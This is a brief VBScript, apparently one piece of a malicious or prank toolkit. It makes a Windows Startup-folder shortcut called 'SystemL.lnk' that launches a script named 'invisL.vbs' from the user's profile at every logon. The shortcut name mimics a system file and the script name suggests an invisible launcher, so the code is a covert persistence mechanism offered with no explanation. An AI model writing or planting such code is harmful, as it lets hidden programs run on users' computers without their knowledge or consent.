Set obj = CreateObject("wscript.shell")
userProfile = obj.ExpandEnvironmentStrings( "%userprofile%" )
Set nLink = obj.CreateShortcut(userProfile & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SystemL.lnk")

nLink.TargetPath = "%userprofile%\invisL.vbs"
nLink.Save